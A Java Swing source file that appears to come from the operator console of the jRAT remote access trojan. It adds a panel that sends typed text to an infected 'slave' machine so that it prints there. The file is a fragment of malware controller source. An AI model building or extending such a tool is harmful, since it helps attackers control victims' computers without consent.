package io.jrat.client.ui.panels;

import io.jrat.client.Slave;
import io.jrat.client.packets.outgoing.Packet69Print;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JScrollPane;
import javax.swing.JTextPane;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;


@SuppressWarnings("serial")
public class PanelControlPrinter extends PanelControlParent {
	private JTextPane textPane;

	public PanelControlPrinter(Slave sl) {
		super(sl);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnPrint = new JButton("Print");
		btnPrint.setIcon(new ImageIcon(PanelControlPrinter.class.getResource("/icons/printer.png")));
		btnPrint.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				slave.addToSendQueue(new Packet69Print(textPane.getText()));
			}
		});

		JButton btnClear = new JButton("Clear");
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				textPane.setText("");
			}
		});
		btnClear.setIcon(new ImageIcon(PanelControlPrinter.class.getResource("/icons/clear.png")));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(btnPrint).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnClear).addContainerGap(420, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 301, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnPrint).addComponent(btnClear)).addContainerGap(20, Short.MAX_VALUE)));

		textPane = new JTextPane();
		scrollPane.setViewportView(textPane);
		setLayout(groupLayout);
	}
}
